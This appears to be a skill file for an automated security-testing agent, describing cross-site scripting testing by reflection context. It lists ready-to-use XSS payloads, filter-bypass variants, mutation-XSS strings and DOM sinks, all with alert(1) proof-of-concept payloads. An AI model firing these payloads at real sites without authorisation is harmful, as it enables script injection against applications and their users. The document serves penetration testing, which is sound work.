---
name: xss-payload-mutation
category: vulnerabilities
description: Cross-site scripting detection with context-aware payload mutation
attack_types: [xss_reflected, xss_stored, xss_dom]
severity_range: [high, medium]
---

# XSS Testing Methodology

## Phase 1: Reflection Detection

Send a unique canary string (e.g., `xss7test9mark`) to every parameter. Check if it appears in the response body. If reflected:

1. Note the reflection context (HTML body, attribute, JavaScript, URL)
2. Count reflection points (same input may reflect multiple times)
3. Check encoding applied (HTML entity, URL encode, none)

## Phase 2: Context-Specific Payloads

### HTML Body Context
The canary appears in raw HTML: `<p>Your search: xss7test9mark</p>`

Payloads (ordered by simplicity):
1. `<script>alert(1)</script>`
2. `<img src=x onerror=alert(1)>`
3. `<svg onload=alert(1)>`
4. `<details open ontoggle=alert(1)>`
5. `<body onload=alert(1)>`

### Attribute Context
The canary is inside an HTML attribute: `<input value="xss7test9mark">`

Payloads:
1. `" onmouseover="alert(1)` — break out of attribute
2. `"><script>alert(1)</script>` — break out of tag
3. `' onfocus='alert(1)' autofocus='` — single-quote context
4. `" onfocus="alert(1)" autofocus="` — double-quote context

### JavaScript Context
The canary is inside a JS string: `var x = "xss7test9mark";`

Payloads:
1. `";alert(1)//` — break string, execute, comment rest
2. `'-alert(1)-'` — arithmetic context escape
3. `\';alert(1)//` — if backslash escaping is used

### URL Context
The canary is in an href or src: `<a href="xss7test9mark">`

Payloads:
1. `javascript:alert(1)`
2. `data:text/html,<script>alert(1)</script>`

## Phase 3: Filter Bypass

If basic payloads are blocked:
1. Case variation: `<ScRiPt>alert(1)</ScRiPt>`
2. Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
3. Double encoding: `%253Cscript%253E`
4. Null bytes: `<scr%00ipt>alert(1)</script>`
5. Tag mutation: `<scr<script>ipt>alert(1)</script>`
6. Event handlers: `<div style="width:expression(alert(1))">`
7. SVG/math: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`

## Phase 4: DOM-Based XSS

Check client-side JavaScript for dangerous sinks:
- `document.write()`, `innerHTML`, `outerHTML`
- `eval()`, `setTimeout()`, `setInterval()`
- `location.href`, `location.hash`, `location.search`

Test by injecting into URL fragments: `#<img src=x onerror=alert(1)>`

## False Positive Prevention

- Payload must EXECUTE, not just reflect. Check if script tags are rendered vs HTML-encoded.
- Response Content-Type must be `text/html` (not `application/json`)
- Check for CSP headers that would block execution
- Verify reflected content is not inside HTML comments
- DOM XSS requires the sink to actually process the tainted data

## Success Indicators

- **Confirmed**: Payload executes (alert fires, DOM changes, or event triggers)
- **Evidence**: Full request + response showing unencoded reflection in executable context
- **Stored XSS**: Payload persists across requests (check second request without payload)
